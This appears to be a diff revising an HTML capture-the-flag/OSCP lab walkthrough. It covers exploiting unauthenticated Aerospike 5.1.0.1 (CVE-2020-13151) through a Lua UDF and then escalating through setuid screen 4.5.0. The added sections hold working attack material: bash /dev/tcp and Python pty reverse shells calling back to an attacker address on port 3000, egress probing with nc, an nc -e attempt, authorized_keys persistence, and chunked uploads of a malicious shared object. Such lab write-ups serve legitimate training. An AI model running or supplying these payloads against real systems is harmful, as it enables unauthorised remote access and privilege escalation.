@@ -326,13 +326,13 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
         <span class="badge">Aerospike 5.1.0.1</span>
         <span class="badge">Apache 2.4.41</span>
         <span class="badge warn">setuid screen 4.5.0</span>
-        <span class="badge warn">no egress</span>
+        <span class="badge warn">egress :3000 only</span>
         <span class="badge ok">root · 2 flags</span>
       </div>
       <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">Recon</span><span class="step-desc">10 open, 65525 <em>filtered</em></span></a>
 <a class="step" href="#ch-02"><span class="step-num">02</span><span class="step-label">Web</span><span class="step-desc">Pico CMS, nginx page on <code>:81</code></span></a>
 <a class="step" href="#ch-03"><span class="step-num">03</span><span class="step-label">Aerospike</span><span class="step-desc"><code>build=5.1.0.1</code>, no auth</span></a>
-<a class="step" href="#ch-04"><span class="step-num">04</span><span class="step-label">UDF</span><span class="step-desc"><code>io.popen</code> → <code>aero</code> · local.txt</span></a>
+<a class="step" href="#ch-04"><span class="step-num">04</span><span class="step-label">UDF</span><span class="step-desc"><code>io.popen</code> → <code>aero</code>, pty on <code>:3000</code></span></a>
 <a class="step" href="#ch-05"><span class="step-num">05</span><span class="step-label">Enum</span><span class="step-desc">PwnKit out, <code>screen-4.5.0</code> in</span></a>
 <a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">screen</span><span class="step-desc"><code>ld.so.preload</code> via <code>umask 000</code></span></a>
 <a class="step" href="#ch-07"><span class="step-num">07</span><span class="step-label">proof.txt</span><span class="step-desc">root, then cleanup</span></a></div>
@@ -751,9 +751,10 @@ three can be read off the box; the third is one call away.</p>
 </table>
 <p>A database that accepts anonymous clients and then runs the code they upload is not a hard target.
 It is an open door with a welcome mat, and the rest of this walkthrough is about what is behind it.</p></div></section>
-<section class="chapter" id="ch-04" data-title="Foothold"><div class="ch-head"><span class="ch-num">04</span><div class="ch-title"><h2>Foothold</h2><p class="ch-sub">Lua that runs shell — and a host that cannot call back</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Chapter 03 named the daemon and the CVE. This chapter turns <code>5.1.0.1</code> into a shell, and records the
-one environmental surprise that shaped everything after it: <strong>the target cannot reach the attacker</strong>,
-so files had to travel over the database socket itself.</p>
+<section class="chapter" id="ch-04" data-title="Foothold"><div class="ch-head"><span class="ch-num">04</span><div class="ch-title"><h2>Foothold</h2><p class="ch-sub">Lua that runs shell — and the port allowlist behind it</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Chapter 03 named the daemon and the CVE. This chapter turns <code>5.1.0.1</code> into a shell, and settles the one
+environmental question that shaped everything after it: <strong>how far can the target reach back?</strong> The
+short answer — an earlier draft of this page said "not at all", and that was wrong. Egress here is a
+<strong>port allowlist</strong>, and one of the allowed ports is <code>3000</code>, the same port the exploit already uses.</p>
 <hr />
 <h3>4.1 The UDF</h3>
 <p>Three lines of Lua are the entire payload:</p>
@@ -772,7 +773,7 @@ connection that sent it. No listener, no callback, no port forward.</p>
 <hr />
 <h3>4.2 Driving the client</h3>
 <p>The published exploit refuses this version (chapter 03, §3.3), so the client library is driven
-directly:</p>
+directly. The full script is in <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/poc_aerospike_rce.py"><code>scripts/poc_aerospike_rce.py</code></a>:</p>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
 <span class="sd">&quot;&quot;&quot;CVE-2020-13151 — Aerospike CE &lt; 5.1.0.3 unauthenticated command execution.&quot;&quot;&quot;</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">string</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span>
@@ -822,57 +823,202 @@ directly:</p>
 <li><strong><code>apply</code> needs a real record key.</strong> The UDF is attached to a record, not invoked globally, so the
   <code>put</code> has to happen first. Without it, <code>apply</code> fails with a not-found rather than anything useful.</li>
 </ul>
+<p>One interpreter trap worth its own line. <code>pip3 install --user aerospike</code> puts the module in
+<code>~/.local/lib/python3.13/site-packages</code>, which <strong>root's Python never reads</strong> — so
+<code>sudo python3 poc_aerospike_rce.py</code> fails with <code>ModuleNotFoundError: No module named 'aerospike'</code>
+while the same command without <code>sudo</code> works. Nothing here needs privileges. If it must run as root,
+install it for root: <code>sudo python3 -m pip install --break-system-packages aerospike</code>.</p>
 <hr />
 <h3>4.3 First command</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--cmd<span class="w"> </span><span class="s1">&#39;id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--ahost<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cmd<span class="w"> </span><span class="s1">&#39;id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt&#39;</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] build: 5.1.0.1
-[+] wrote dummy record test.cve202013151/wblhqohwkzqpgqed
-[+] registered UDF module 'poc'
 [+] executing: id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt
-
-===== OUTPUT =====
 uid=1000(aero) gid=1000(aero) groups=1000(aero)
-lab-pwk2-student-cl4-143-ubuntu20-aero-242-100
+lab-pwk2-student-cl4-143-ubuntu20-aero-241-102
 5.4.0-104-generic
 ---LOCAL---
-8d0b2414df3c73b491d05711c000a9d6
-==================</span></pre></div>
+89fa94be5fc49493528ce6f5096c3ff0</span></pre></div>
 <p><code>uid=1000(aero)</code> — the daemon runs as an unprivileged service account, as it should. The hostname is
 worth reading twice: it encodes the lab, the student, the OS and the account
-(<code>…-ubuntu20-aero-242-100</code>), which is a small information leak in its own right and also a reminder
+(<code>…-ubuntu20-aero-241-102</code>), which is a small information leak in its own right and also a reminder
 that this image is built per-student and not hand-hardened.</p>
 <p><strong><code>local.txt</code> is captured in the first command</strong>, because the daemon's own user can read it — no
 escalation needed.</p>
-<p>That is the good news. The bad news arrives with the next test.</p>
+<p>The transcript above is from a rebuilt instance at <code>192.168.152.143</code>; the original engagement ran
+against <code>192.168.150.143</code> (<code>…-aero-242-100</code>) with a different flag. Same image, same build string,
+same everything that matters. The next question is what that shell can and cannot do.</p>
 <hr />
-<h3>4.4 The target cannot call back</h3>
-<p>A reverse shell was the obvious next step. It does not work:</p>
+<h3>4.4 Egress is filtered by port, not blocked</h3>
+<p>A reverse shell was the obvious next step, and the first attempt produced nothing at all. The
+tempting conclusion — "the target has no route to the attacker" — is only half right, and the half
+that is wrong costs you the whole TTY.</p>
+<p>The target's routing is ordinary:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">$ ip route
+default via 192.168.152.254 dev ens3 proto static
+192.168.152.0/24 dev ens3 proto kernel scope link src 192.168.152.143
+
+$ ip route get 192.168.45.158
+192.168.45.158 via 192.168.152.254 dev ens3 src 192.168.152.143 uid 1000</span></pre></div>
+<p>There is a default route and the attacker address resolves through it. Packets leave. What happens
+next is a <strong>destination-port allowlist</strong>, and the only way to see it is to have the target dial a
+listener you control and print the exit status — <code>io.popen</code> captures <strong>stdout only</strong>, so a bare
+<code>bash -c 'cat &lt;/dev/null &gt;/dev/tcp/…'</code> that fails prints nothing and looks like a hang.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span><span class="w">    </span>#<span class="w"> </span>attacker,<span class="w"> </span>listening<span class="w"> </span>first
+</pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## via the UDF — note the explicit rc, because stderr never comes back</span>
+<span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="m">8834</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;%s: &#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span>
+<span class="w">  </span>nc<span class="w"> </span>-zv<span class="w"> </span>-w3<span class="w"> </span><span class="m">192</span>.168.45.158<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-1
+<span class="k">done</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">22: Connection refused
+53: Connection refused
+80: Connection refused
+443: Connection refused
+4444: timed out
+8080: timed out
+8834: timed out</span></pre></div>
+<p>Read the two answers carefully, because they are not the same failure:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Connection refused</code></td>
+<td>The SYN <strong>arrived</strong>. Kali's kernel answered with RST because nothing was listening. The path is open.</td>
+</tr>
+<tr>
+<td><code>timed out</code></td>
+<td>The SYN was <strong>dropped in transit</strong>. Nothing will ever arrive, listener or not.</td>
+</tr>
+</tbody>
+</table>
+<p>So <code>22</code>, <code>53</code>, <code>80</code>, <code>443</code> are permitted and <code>4444</code>, <code>8080</code>, <code>8834</code> are not. That is an allowlist of
+common service ports — the lab's own plumbing, not a blackhole.</p>
+<p>The decisive test is the obvious one: put a listener on a <strong>permitted</strong> port. <code>3000</code> is free on Kali,
+above 1024 so it needs no root, and — because it is Aerospike's own port — it is on the allowlist.</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## attacker</span>
-nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">3000</span>
 </pre></div>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## via the UDF</span>
-timeout<span class="w"> </span><span class="m">5</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;cat &lt; /dev/null &gt; /dev/tcp/192.168.45.158/4444&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>PORT_4444_OK<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>PORT_4444_BLOCKED
+timeout<span class="w"> </span><span class="m">5</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;echo SMOKE-3000 &gt;/dev/tcp/192.168.45.158/3000&#39;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">rc</span><span class="o">=</span><span class="nv">$?</span>
 </pre></div>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">PORT_4444_BLOCKED</span></pre></div>
-<p>Same answer for HTTP:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-m<span class="w"> </span><span class="m">4</span><span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;%{http_code}\n&#39;</span><span class="w"> </span>http://192.168.45.158:8000/
-</pre></div>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">000</span></pre></div>
-<p>The lab VM has <strong>no route to the attacker's tunnel address</strong>. Outbound to <code>192.168.45.158</code> is
-dropped; the tunnel is one-way for our purposes. Every reverse shell, every <code>wget</code> of a payload,
-every <code>curl | bash</code> — all dead. (This is a property of the lab's network, not of the box: the same
-attacker address is reachable <em>from</em> Kali <em>to</em> the target, just not back.)</p>
-<p>So the constraints for the rest of the engagement are:</p>
-<ol>
-<li>No inbound listener on the attacker.</li>
-<li>No outbound fetch on the target.</li>
-<li>Only the Aerospike socket survives, and it is bidirectional.</li>
-</ol>
-<p>Point 3 is the way through. The socket that gave code execution can also carry bytes.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">rc=0</span></pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">listening on [any] 3000 ...
+connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38008
+SMOKE-3000</span></pre></div>
+<p>A round trip in both directions. <strong>The target can call back — on <code>3000</code>, <code>22</code>, <code>53</code>, <code>80</code> or <code>443</code>.</strong></p>
+<blockquote>
+<p><strong>The blind test is worthless.</strong> Before the listener existed, ten attempts from the target to
+<code>4444</code> all failed and the listener log stayed empty:</p>
+<p><code>attempt1 FAIL … attempt10 FAIL      (target side)
+listening on [any] 4444 ...         (attacker side, no SYNs at all)</code></p>
+<p>Identical output for "no listener", "filtered port" and "wrong address". If you cannot tell those
+apart, you cannot conclude anything about the network. Start the listener, then test.</p>
+</blockquote>
 <hr />
-<h3>4.5 A file transport that fits in a UDF call</h3>
+<h3>4.5 A reverse shell on an allowed port</h3>
+<p>With <code>3000</code> proven bidirectional, the reverse shell is three lines. The child must be <strong>backgrounded
+with all three streams redirected</strong>, or <code>io.popen</code> blocks on <code>read()</code> until the client times out:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--ahost<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cmd<span class="w"> </span><span class="s1">&#39;setsid bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.158/3000 0&gt;&amp;1&quot; &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;&#39;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] build: 5.1.0.1
+[+] executing: setsid bash -c "bash -i &gt;&amp; /dev/tcp/192.168.45.158/3000 0&gt;&amp;1" &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;</span></pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">3000</span><span class="w">    </span>#<span class="w"> </span>attacker
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">listening on [any] 3000 ...
+connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38034
+bash: cannot set terminal process group (4750): Inappropriate ioctl for device
+bash: no job control in this shell
+aero@lab-pwk2-student-cl4-143-ubuntu20-aero-241-102:/$ whoami
+aero</span></pre></div>
+<p>That warning pair is harmless — it is bash saying it has no controlling terminal. It also tells you
+what you are missing: no <code>sudo</code> prompt, no <code>su</code>, no <code>ssh</code> password entry, no <code>top</code> or <code>less</code> without
+<code>TERM</code>. For a real PTY, spawn one from the target's own Python. Full payload in
+<a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/revshell.py"><code>scripts/revshell.py</code></a>:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;Connect back and hand the socket to a pty — a terminal, not a pipe.&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">pty</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s2">&quot;192.168.45.158&quot;</span><span class="p">,</span> <span class="mi">3000</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="n">fd</span><span class="p">)</span>
+<span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
+</pre></div>
+<p>Staged through the UDF with a heredoc, then detached:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--ahost<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span>--cmd<span class="w"> </span><span class="s1">&#39;cat &gt; /tmp/.rs.py &lt;&lt;&quot;PY&quot;</span>
+<span class="s1">import os, pty, socket</span>
+<span class="s1">s = socket.socket()</span>
+<span class="s1">s.connect((&quot;192.168.45.158&quot;, 3000))</span>
+<span class="s1">for fd in (0, 1, 2):</span>
+<span class="s1">    os.dup2(s.fileno(), fd)</span>
+<span class="s1">pty.spawn(&quot;/bin/bash&quot;)</span>
+<span class="s1">PY</span>
+<span class="s1">setsid nohup python3 /tmp/.rs.py &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;&#39;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38014
+aero@lab-pwk2-student-cl4-143-ubuntu20-aero-241-102:/$ id; tty
+uid=1000(aero) gid=1000(aero) groups=1000(aero)
+/dev/pts/0</span></pre></div>
+<p><code>/dev/pts/0</code> is the difference between "I can run commands" and "I have a session". <code>pty.spawn</code> also
+gives you <code>Ctrl-C</code>, <code>Ctrl-Z</code>, bash history and a working <code>TERM</code>.</p>
+<p>For anything beyond a few commands, the <code>--cmd-file</code> variant of the helper is easier than quoting a
+heredoc into a shell argument:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>scripts/aero_cmd.py<span class="w"> </span>--host<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span>--cmd-file<span class="w"> </span>revshell_stage.sh
+</pre></div>
+<p>Every failure that cost time here, and why:</p>
+<table>
+<thead>
+<tr>
+<th>Attempt</th>
+<th>Why it failed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>bash -i &gt;&amp; /dev/tcp/…/4444 0&gt;&amp;1</code></td>
+<td>No listener was running. The connection was refused instantly, and <code>io.popen</code> discarded stderr, so the UDF returned an empty string.</td>
+</tr>
+<tr>
+<td>Same, retried with a listener</td>
+<td><code>4444</code> is not on the allowlist. The SYN never arrived.</td>
+</tr>
+<tr>
+<td><code>nc -e bin/sh 192.168.45.158 4444</code></td>
+<td>Two bugs: the path is <code>/bin/sh</code>, and the target's <code>nc</code> is the OpenBSD build, which has no <code>-e</code> at all.</td>
+</tr>
+<tr>
+<td><code>ping 192.168.45.158 4444</code></td>
+<td><code>ping</code> takes no port, and without <code>-c</code> it never exits — so <code>io.popen</code> blocked and the client raised <code>TimeoutError: (9, 'Client timeout: socket=8000 total=8000 iterations=1 …')</code>. That error was the command hanging, not the firewall.</td>
+</tr>
+</tbody>
+</table>
+<p>Three rules that follow:</p>
+<ol>
+<li><strong>Background the child</strong> (<code>setsid … &amp;</code>, all three streams redirected). A foreground shell, <code>ping</code>
+   without <code>-c</code>, <code>top</code>, or any watcher will block <code>apply()</code> into a timeout.</li>
+<li><strong>Append <code>2&gt;&amp;1</code></strong> to anything you might need to read. The UDF returns stdout only; silence is
+   not success.</li>
+<li><strong>Pick a port on the allowlist.</strong> <code>3000</code> is the natural choice on this box and needs no
+   privileges on the attacker.</li>
+</ol>
+<hr />
+<h3>4.6 A file transport that fits in a UDF call</h3>
+<p>Even with a shell, binary uploads over a reverse shell are awkward — a terminal is a bad pipe for
+<code>base64</code> pastes of a 14 KB shared object. The socket transport is still the reliable path, and it is
+the only path when no allowlisted port happens to be free.</p>
 <p>Binary payloads cannot ride a shell one-liner, and <code>base64</code> output through <code>io.popen</code> is fine but
 each <code>apply()</code> blocks a server thread. The compromise is <strong>chunked base64 appended to a temp file</strong>,
 with a small chunk size so no single call outlives the client timeout:</p>
@@ -884,7 +1030,7 @@ with a small chunk size so no single call outlives the client timeout:</p>
     <span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;printf &#39;%s&#39; &#39;</span><span class="si">{</span><span class="n">b64</span><span class="p">[</span><span class="n">off</span><span class="p">:</span><span class="n">off</span><span class="o">+</span><span class="n">CHUNK</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &gt;&gt; </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 <span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;base64 -d </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &gt; </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; rm -f </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &amp;&amp; chmod </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; sha256sum </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 </pre></div>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.150.143<span class="w"> </span>python3<span class="w"> </span>poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.152.143<span class="w"> </span>python3<span class="w"> </span>poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>--local<span class="w"> </span>/tmp/screen_poc/libhax.so<span class="w"> </span>--remote<span class="w"> </span>/tmp/screenroot/libhax.so<span class="w"> </span>--mode<span class="w"> </span><span class="m">755</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] uploading /tmp/screen_poc/libhax.so (14264 bytes) -&gt; /tmp/screenroot/libhax.so
@@ -899,13 +1045,19 @@ hash. <code>sha256sum</code> returning nothing is the tell. Create the directory
 always compare the remote hash to the local one before using the file.</p>
 </blockquote>
 <hr />
-<h3>4.6 Interactive access</h3>
+<h3>4.7 Interactive access</h3>
 <p>The socket is a fine command channel but a poor terminal. It has no TTY, no job control, and an 8 s
 ceiling per call; anything long-running (a <code>find /</code>, a watcher) dies mid-call.</p>
-<p>Root SSH keys come later (chapter 06), but even as <code>aero</code> the cleanest interactive path is the same
-idea one level down: write a key, connect on 22. That gives a real shell, arrow keys and <code>sudo</code> that
-can prompt. It is also the difference between "I have code execution" and "I have a session" — worth
-doing before enumeration, because enumeration is interactive work.</p>
+<p>Two ways to fix that, and they are not exclusive:</p>
+<ul>
+<li><strong>Reverse shell on an allowlisted port</strong> (§4.5). No key, no daemon, works as soon as you have the
+  UDF. Good for the rest of the session, lost when the box rebuilds.</li>
+<li><strong>SSH key on 22.</strong> Write <code>~/.ssh/authorized_keys</code> for <code>aero</code>, then <code>ssh -i key aero@target</code> for a
+  durable session with full job control. 22 is open inbound from Kali, so this needs no exotic
+  routing.</li>
+</ul>
+<p>It is also the difference between "I have code execution" and "I have a session" — worth doing before
+enumeration, because enumeration is interactive work.</p>
 <p>With a shell in hand and <code>local.txt</code> already banked, the next chapter is the one that decides the
 box: what does <code>aero</code> have that <code>aero</code> should not.</p></div></section>
 <section class="chapter" id="ch-05" data-title="Enumeration"><div class="ch-head"><span class="ch-num">05</span><div class="ch-title"><h2>Enumeration</h2><p class="ch-sub">Two refutations, one unreadable cron, no compiler</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>A service account with no sudo, no group memberships and no writable system paths — on paper. What
@@ -989,7 +1141,8 @@ recorded here as such — not as tested.</p>
 <h3>5.4 The toolchain question</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>which<span class="w"> </span>gcc<span class="w"> </span>cc<span class="w"> </span>make
 </pre></div>
-<p>Nothing. There is no compiler on the target, and no way to fetch one (chapter 04: no egress). Every
+<p>Nothing. There is no compiler on the target, and no toolchain worth fetching (chapter 04: egress is
+limited to the lab's allowlisted ports, so there is no <code>apt</code> and no <code>wget</code> back to Kali). Every
 binary payload for this box has to be <strong>built on Kali and pushed through the database socket</strong>.</p>
 <p>That has one hard consequence: <strong>glibc version</strong>. Kali ships a much newer glibc than Ubuntu 20.04
 (2.31). A shared object built against Kali's headers will refuse to load on the target with a symbol
@@ -1129,8 +1282,9 @@ ls<span class="w"> </span>-la<span class="w"> </span>/tmp/screenroot
 strip<span class="w"> </span>--strip-unneeded<span class="w"> </span>libhax.so
 objdump<span class="w"> </span>-T<span class="w"> </span>libhax.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">&#39;GLIBC_[0-9.]+&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV<span class="w">   </span>#<span class="w"> </span>-&gt;<span class="w"> </span>GLIBC_2.2.5
 </pre></div>
-<p>No compiler on the target, no egress from the target: push both files through the Aerospike socket
-(chapter 04, §4.5), verifying the hash on the far side.</p>
+<p>No compiler on the target and no way to fetch one: push both files through the Aerospike socket
+(chapter 04, §4.6), verifying the hash on the far side. A reverse shell (§4.5) gives you a terminal,
+but a terminal is a poor transport for a 14 KB shared object.</p>
 <hr />
 <h3>6.4 Writing the preload file — and the CRLF trap</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cd</span><span class="w"> </span>/etc<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">umask</span><span class="w"> </span><span class="m">000</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
@@ -1312,9 +1466,11 @@ checklist. A UDF is code you installed on someone else's server.)</p>
 <li><strong>CRLF is a real bug class.</strong> screen logs terminal output, terminals use <code>\r\n</code>, and <code>ld.so</code>
    treats <code>\r</code> as part of the path. The exploit "worked" and did nothing, with only a warning to say
    so. <code>cat -A</code> is how you see it.</li>
-<li><strong>No egress changes the whole workflow.</strong> With no reverse shell and no <code>wget</code>, files move over
-   whatever channel already exists — here, the database socket that gave code execution. That is
-   slower and needs hash verification at every hop, but it is not optional.</li>
+<li><strong>"No egress" was a misdiagnosis, and the port list is the fix.</strong> The target could reach the
+   attacker the whole time — on the lab's allowlisted ports. <code>4444</code> and <code>8000</code> are dropped, which
+   makes a blocked port look exactly like a dead route; <code>3000</code> is permitted and yields a pty shell.
+   The socket transport still earns its place: <strong>a terminal is a terrible way to push a 14 KB shared
+   object</strong>, and chunked base64 with a remote <code>sha256sum</code> is verifiable in a way a paste is not.</li>
 </ol>
 <hr />
 <h3>7.4 Defensive notes</h3>
@@ -1372,6 +1528,10 @@ checklist. A UDF is code you installed on someone else's server.)</p>
 <tr>
 <td>"<code>screen -L</code> wrote the preload file, so it's done"</td>
 <td>It wrote it with <strong>CRLF</strong>, and <code>ld.so</code> silently ignored every entry. The rewrite was required.</td>
+</tr>
+<tr>
+<td>"The target has no egress — reverse shells are impossible here"</td>
